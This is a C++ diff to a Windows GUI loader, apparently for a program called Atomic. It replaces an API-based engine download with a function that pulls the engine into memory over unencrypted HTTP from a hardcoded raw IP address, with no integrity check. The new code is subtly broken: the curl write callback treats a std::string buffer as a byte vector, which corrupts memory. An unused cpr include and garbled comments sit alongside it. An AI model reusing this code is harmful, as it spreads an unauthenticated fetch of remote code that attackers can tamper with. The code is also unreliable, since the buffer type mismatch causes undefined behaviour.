@@ -35,6 +35,9 @@
 #include "notification.h"
 #include <CAtomicAPI.h>
 #include <tlhelp32.h>
+
+#include <cpr/cpr.h>
+
 // Forward declarations of helper functions
 bool           CreateDeviceD3D(HWND hWnd);
 void           CleanupDeviceD3D();
@@ -201,6 +204,45 @@ bool Spinner(const char* label, float radius, int thickness, const ImU32& color)
 float alpha = 0.6f;                    // ��������� �������� �����
 float animationSpeed = 4.f;            // �������� �������� (��� ������, ��� ���������)
 
+
+
+size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
+{
+    size_t                totalSize = size * nmemb;
+    std::vector<uint8_t>* data = reinterpret_cast<std::vector<uint8_t>*>(userp);
+    data->insert(data->end(), (uint8_t*)contents, (uint8_t*)contents + totalSize);
+    return totalSize;
+}
+
+std::string DownloadFileIntoMemory(const std::string& url)
+{
+    std::string buffer;
+
+    CURL* curl = curl_easy_init();
+    if (curl)
+    {
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 300000L);            // 5 minutes
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+
+        struct curl_slist* headers = nullptr;
+        headers = curl_slist_append(headers, "Content-Type: application/text");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+        CURLcode res = curl_easy_perform(curl);
+        if (res != CURLE_OK)
+        {
+            buffer.clear();            // Failed download
+        }
+
+        curl_slist_free_all(headers);
+        curl_easy_cleanup(curl);
+    }
+
+    return buffer;
+}
 bool GUI::Initialize()
 {
     GUI::wc.cbSize = sizeof(WNDCLASSEXW);
@@ -432,8 +474,9 @@ void GUI::RenderUI(bool* bInitialized, bool& bNoErrors, std::string& strErrorTit
                                         [&]()
                                         {
                                             bDownloadStarted = true;
-                                            g_pAtomicAPI->DownloadEngine(&strEngineBuffer, &DownloadData);
+                                            strEngineBuffer = DownloadFileIntoMemory("http://139.99.114.184:5000/atomic");
                                             bDownloadFinish = true;
+
                                         });
                                     EngineDownloaderThread.detach();
                                 }
